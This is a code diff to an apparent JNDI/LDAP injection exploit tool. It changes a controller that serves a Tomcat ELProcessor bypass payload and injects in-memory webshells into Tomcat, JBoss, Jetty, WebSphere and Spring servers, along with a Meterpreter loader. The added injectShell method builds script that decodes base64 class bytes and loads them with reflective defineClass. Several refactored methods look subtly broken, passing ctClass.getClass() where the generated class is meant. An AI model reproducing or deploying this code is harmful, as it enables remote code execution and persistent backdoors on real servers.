@@ -4,10 +4,6 @@ import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.exceptions.IncorrectParamsException;
 import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
 import com.nu1r.jndi.template.*;
-import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
-import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
-import com.nu1r.jndi.template.jboss.JBSMSFromContextS;
-import com.nu1r.jndi.template.jetty.JFMSFromJMXF;
 import com.nu1r.jndi.template.jetty.JSMSFromJMXS;
 import com.nu1r.jndi.template.spring.SpringInterceptorMS;
 import com.nu1r.jndi.template.tomcat.*;
@@ -44,7 +40,6 @@ public class TomcatBypassController implements LdapController {
             ".eval(\"{replacement}\")" +
             "}";
 
-
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with javax.el.ELProcessor payload|@"));
@@ -58,11 +53,7 @@ public class TomcatBypassController implements LdapController {
         ref.add(new StringRefAddr("forceString", "x=eval"));
 
         TomcatBypassHelper helper = new TomcatBypassHelper();
-        String    code       = null;
-        String    className  = "";
-        CtClass   ctClass    = null;
-        ClassPool pool       = ClassPool.getDefault();
-        byte[]    classBytes = new byte[0];
+        String             code   = null;
 
 
         //具体分化在这里
@@ -183,18 +174,7 @@ public class TomcatBypassController implements LdapController {
     }
 
     private class TomcatBypassHelper {
-        /*
-            在对代码进行改写时需要注意：
-                ① 所有的数据类型修改为 var, 包括 byte[] bytes ( var bytes )
-                ② 必须使用全类名
-                ③  System.out.println() 需要修改为 print()
-                ④  try{...}catch(Exception e){...}  需要修改为 try{...}catch(err){...}
-                ⑤  双引号改为单引号
-                ⑥  Class.forName() 需要改为 java.lang.Class.forName(), String 需要改为 java.lang.String等
-                ⑦  去除类型强转
-                ⑧  不能用 sun.misc.BASE64Encoder，会抛异常  javax.script.ScriptException: ReferenceError: "sun" is not defined in <eval> at line number 1
-                ⑨  不能使用  for(Object obj : objects) 循环
-         */
+
 
         public String getExecCode(String cmd) throws IOException {
 
@@ -237,140 +217,128 @@ public class TomcatBypassController implements LdapController {
         }
 
         public String injectTomcatEcho() {
-            return injectMemshell(TomcatEchoTemplate.class);
+            return injectClass(TomcatEchoTemplate.class);
         }
 
         public String injectSpringEcho() {
-            return injectMemshell(SpringEchoTemplate.class);
+            return injectClass(SpringEchoTemplate.class);
         }
 
         public String injectSuccess() {
-            return injectMemshell(isSuccess.class);
+            return injectClass(isSuccess.class);
         }
 
-        //        public String injectMeterpreter(){return injectMemshell(Meterpreter.class);}
+        //        public String injectMeterpreter(){return injectClass(Meterpreter.class);}
         public String injectMeterpreter() throws NoSuchFieldException, IllegalAccessException {
             System.out.println("------------------------");
-            return injectMemshell(Meterpreter.class);
+            return injectClass(Meterpreter.class);
         }
 
         public String injectTomcatFilterJmx() throws Exception {
-            String    className  = "";
-            CtClass   ctClass    = null;
-            ClassPool pool       = ClassPool.getDefault();
-            className = TFMSFromJMXF.class.getName();
-            ctClass = pool.get(className);
-            insertKeyMethod(ctClass,"bx");
-            return injectMemshell(TFMSFromJMXF.class);
+            String    className = "TFMSFromJMXF";
+            ClassPool pool      = ClassPool.getDefault();
+            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TFMSFromJMXF");
+            insertKeyMethod(ctClass, "bx");
+            ctClass.setName(className);
+            return injectClass(ctClass.getClass());
         }
 
         public String injectTomcatFilterTh() throws Exception {
-            String    className  = "";
-            CtClass   ctClass    = null;
-            ClassPool pool       = ClassPool.getDefault();
-            className = TFMSFromJMXF.class.getName();
-            ctClass = pool.get(className);
-            insertKeyMethod(ctClass,"bx");
-            return injectMemshell(TFMSFromThreadF.class);
+            String    className = "TFMSFromThreadF";
+            ClassPool pool      = ClassPool.getDefault();
+            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TFMSFromThreadF");
+            insertKeyMethod(ctClass, "bx");
+            ctClass.setName(className);
+            return injectClass(ctClass.getClass());
         }
 
         public String injectTomcatListenerJmx() throws Exception {
-            String    className  = "";
-            CtClass   ctClass    = null;
-            ClassPool pool       = ClassPool.getDefault();
-            className = TFMSFromJMXF.class.getName();
-            ctClass = pool.get(className);
-            insertKeyMethod(ctClass,"bx");
-            return injectMemshell(TLMSFromJMXLi.class);
+            String    className = "TLMSFromJMXLi";
+            ClassPool pool      = ClassPool.getDefault();
+            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TLMSFromJMXLi");
+            insertKeyMethod(ctClass, "bx");
+            ctClass.setName(className);
+            return injectClass(ctClass.getClass());
         }
 
         public String injectTomcatListenerTh() throws Exception {
-            String    className  = "";
-            CtClass   ctClass    = null;
-            ClassPool pool       = ClassPool.getDefault();
-            className = TFMSFromJMXF.class.getName();
-            ctClass = pool.get(className);
-            insertKeyMethod(ctClass,"bx");
-            return injectMemshell(TLMSFromThreadLi.class);
+            String    className = "TLMSFromThreadLi";
+            ClassPool pool      = ClassPool.getDefault();
+            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TLMSFromThreadLi");
+            insertKeyMethod(ctClass, "bx");
+            ctClass.setName(className);
+            return injectClass(ctClass.getClass());
         }
 
         public String injectTomcatServletJmx() throws Exception {
-            String    className  = "";
-            CtClass   ctClass    = null;
-            ClassPool pool       = ClassPool.getDefault();
-            className = TFMSFromJMXF.class.getName();
-            ctClass = pool.get(className);
-            insertKeyMethod(ctClass,"bx");
-            return injectMemshell(TSMSFromJMXS.class);
+            String    className = "TSMSFromJMXS";
+            ClassPool pool      = ClassPool.getDefault();
+            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TSMSFromJMXS");
+            insertKeyMethod(ctClass, "bx");
+            ctClass.setName(className);
+            return injectClass(ctClass.getClass());
         }
 
         public String injectTomcatServletTh() throws Exception {
-            String    className  = "";
-            CtClass   ctClass    = null;
-            ClassPool pool       = ClassPool.getDefault();
-            className = TFMSFromJMXF.class.getName();
-            ctClass = pool.get(className);
-            insertKeyMethod(ctClass,"bx");
-            return injectMemshell(TSMSFromThreadS.class);
+            String    className = "TSMSFromThreadS";
+            ClassPool pool      = ClassPool.getDefault();
+            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TSMSFromThreadS");
+            insertKeyMethod(ctClass, "bx");
+            ctClass.setName(className);
+            return injectClass(ctClass.getClass());
         }
 
         public String injectJBossFilter() throws Exception {
-            String    className  = "";
-            CtClass   ctClass    = null;
-            ClassPool pool       = ClassPool.getDefault();
-            className = TFMSFromJMXF.class.getName();
-            ctClass = pool.get(className);
-            insertKeyMethod(ctClass,"bx");
-            return injectMemshell(JBFMSFromContextF.class);
+            String    className = "JBFMSFromContextF";
+            ClassPool pool      = ClassPool.getDefault();
+            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.jboss.JBFMSFromContextF");
+            insertKeyMethod(ctClass, "bx");
+            ctClass.setName(className);
+            return injectClass(ctClass.getClass());
         }
 
         public String injectJBossServlet() throws Exception {
-            String    className  = "";
-            CtClass   ctClass    = null;
-            ClassPool pool       = ClassPool.getDefault();
-            className = TFMSFromJMXF.class.getName();
-            ctClass = pool.get(className);
-            insertKeyMethod(ctClass,"bx");
-            return injectMemshell(JBSMSFromContextS.class);
+            String    className = "JBSMSFromContextS";
+            ClassPool pool      = ClassPool.getDefault();
+            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.jboss.JBSMSFromContextS");
+            insertKeyMethod(ctClass, "bx");
+            ctClass.setName(className);
+            return injectClass(ctClass.getClass());
         }
 
         public String injectJettyFilter() throws Exception {
-            String    className  = "";
-            CtClass   ctClass    = null;
-            ClassPool pool       = ClassPool.getDefault();
-            className = TFMSFromJMXF.class.getName();
-            ctClass = pool.get(className);
-            insertKeyMethod(ctClass,"bx");
-            return injectMemshell(JFMSFromJMXF.class);
+            String    className = "JFMSFromJMXF";
+            ClassPool pool      = ClassPool.getDefault();
+            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.jetty.JFMSFromJMXF");
+            insertKeyMethod(ctClass, "bx");
+            ctClass.setName(className);
+            return injectClass(ctClass.getClass());
         }
 
         public String injectJettyServlet() throws Exception {
-            String    className  = "";
-            CtClass   ctClass    = null;
-            ClassPool pool       = ClassPool.getDefault();
-            className = TFMSFromJMXF.class.getName();
-            ctClass = pool.get(className);
-            insertKeyMethod(ctClass,"bx");
-            return injectMemshell(JSMSFromJMXS.class);
+            String    className = "JSMSFromJMXS";
+            ClassPool pool      = ClassPool.getDefault();
+            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.jetty.JSMSFromJMXS");
+            insertKeyMethod(ctClass, "bx");
+            ctClass.setName(className);
+            return injectClass(ctClass.getClass());
         }
 
         public String injectWSFilter() throws Exception {
-            String    className  = "";
-            CtClass   ctClass    = null;
-            ClassPool pool       = ClassPool.getDefault();
-            className = TFMSFromJMXF.class.getName();
-            ctClass = pool.get(className);
-            insertKeyMethod(ctClass,"ws");
-            return injectMemshell(WSFMSFromThread.class);
+            String    className = "WSFMSFromThread";
+            ClassPool pool      = ClassPool.getDefault();
+            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.Websphere.WSFMSFromThread");
+            insertKeyMethod(ctClass, "ws");
+            ctClass.setName(className);
+            return injectClass(ctClass.getClass());
         }
 
         public String injectSpringInterceptor() throws Exception {
-            String    className  = "";
-            CtClass   ctClass    = null;
-            ClassPool pool       = ClassPool.getDefault();
-            className = SpringInterceptorMS.class.getName();
-            String target = "com.nu1r.jndi.template.spring.SpringMemshellTemplate";
-            CtClass springTemplateClass = pool.get(target);
+            byte[]    classBytes;
+            ClassPool pool                = ClassPool.getDefault();
+            CtClass   ctClass             = pool.get("com.nu1r.jndi.template.spring.SpringInterceptorMS");
+            String    target              = "com.nu1r.jndi.template.spring.SpringMemshellTemplate";
+            CtClass   springTemplateClass = pool.get(target);
             // 类名后加时间戳
             String clazzName = target + System.nanoTime();
             springTemplateClass.setName(clazzName);
@@ -382,11 +350,13 @@ public class TomcatBypassController implements LdapController {
             String clazzNameContent = "clazzName=\"" + clazzName + "\";";
             ctClass.makeClassInitializer().insertBefore(clazzNameContent);
             ctClass.setName(SpringInterceptorMS.class.getName() + System.nanoTime());
-            return injectMemshell(SpringInterceptorMS.class);
+            classBytes = ctClass.toBytecode();
+            clazzName = SpringInterceptorMS.class.getName() + System.nanoTime();
+            return injectShell(classBytes, clazzName);
         }
 
         //类加载方式，因类而异
-        public String injectMemshell(Class clazz) {
+        public String injectClass(Class clazz) {
 
             String classCode = null;
             try {
@@ -411,5 +381,32 @@ public class TomcatBypassController implements LdapController {
 
             return code;
         }
+
+        public String injectShell(byte[] classBytes, String clazzName) {
+
+            String classCode = null;
+            try {
+                //获取base64后的类
+                classCode = Util.getClassType(classBytes);
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+
+            String code = "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
+                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
+                    "try{\n" +
+                    "   var clazz = classLoader.loadClass('" + clazzName + "');\n" +
+                    "   clazz.newInstance();\n" +
+                    "}catch(err){\n" +
+                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
+                    "   method.setAccessible(true);\n" +
+                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
+                    "   clazz.newInstance();\n" +
+                    "};";
+
+            return code;
+        }
+
     }
 }
